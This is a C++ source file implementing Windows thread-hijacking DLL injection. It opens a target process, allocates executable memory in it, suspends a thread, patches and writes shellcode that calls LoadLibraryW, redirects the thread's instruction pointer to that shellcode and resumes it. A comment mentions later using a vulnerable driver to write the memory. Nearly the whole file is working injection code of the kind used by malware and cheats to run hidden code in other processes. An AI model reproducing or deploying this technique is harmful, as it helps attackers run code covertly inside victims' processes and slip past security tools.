// ThreadHijacking.cpp : Defines the entry point for the console application.
//

#include "utils.h"
#include "shellcode.h"


int main()
{
	DWORD procID = 1337;
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	threadHijacking(proc, L"test.dll");

	WaitForSingleObject(proc, INFINITE);
    return 0;
}

void threadHijacking(HANDLE proc, const wchar_t* dllPath) {

	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
	LPVOID loadlibrary = GetProcAddress(kernel32, "LoadLibraryW"); //addr of loadlibrary.

																   // in this case func = load dll.
																   //allocating space in memory for path and shellcode
	int pathLength = wcslen(dllPath) + 1;
	int path_plus_shell = pathLength + sizeof(shellcode);
	LPVOID stringMem = VirtualAllocEx(proc, NULL, path_plus_shell, MEM_COMMIT, PAGE_EXECUTE);
	LPVOID shellCodeMem = (LPVOID)((DWORD)stringMem + pathLength);
	/*
	we got spaces for path + shellcode
	*/

	// we want to get process Thread ID as well

	// suspend the thread and query its control context
	DWORD threadID = GetProcessThreadID(proc);

	// setting thread specific access rights
	//THREAD_SUSPEND_RESUME for suspension of thread
	//THREAD_GET_CONTEXT : Required to read the context of a thread using GetThreadContext. // MSDN
	//THREAD_SET_CONTEXT : Required to write the context of a thread using SetThreadContext. // MSDN
	HANDLE thread = OpenThread((THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_SET_CONTEXT), false, threadID);
	SuspendThread(thread);
	//not that the thread is suspended, we can extract thread context information
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_CONTROL; // // SS:SP, CS:IP, FLAGS, BP
	GetThreadContext(thread, &threadContext); //2nd arg to extract context info

											  //shellcode modification
	memcpy(&shellcode[3], &stringMem, 4); //PUSH &stringMem
	memcpy(&shellcode[8], &loadlibrary, 4); // MOV EAX, &LoadLibrary
	memcpy(&shellcode[20], &threadContext.Eip, 4); //Eip -> Rip if compiling for 64bit


												   //code caving
												   //later I plan to use WPM using vulnerable driver asmmap from warya
	WriteProcessMemory(proc, stringMem, dllPath, pathLength, NULL);
	WriteProcessMemory(proc, shellCodeMem, shellcode, sizeof(shellcode), NULL);


	//hijacking the thread, set EIp (RIP) to shellcode
	threadContext.Eip = (DWORD)shellCodeMem;
	threadContext.ContextFlags = CONTEXT_CONTROL;
	SetThreadContext(thread, &threadContext);

	//as if nothing hapnned
	ResumeThread(thread);
	CloseHandle(thread);

}




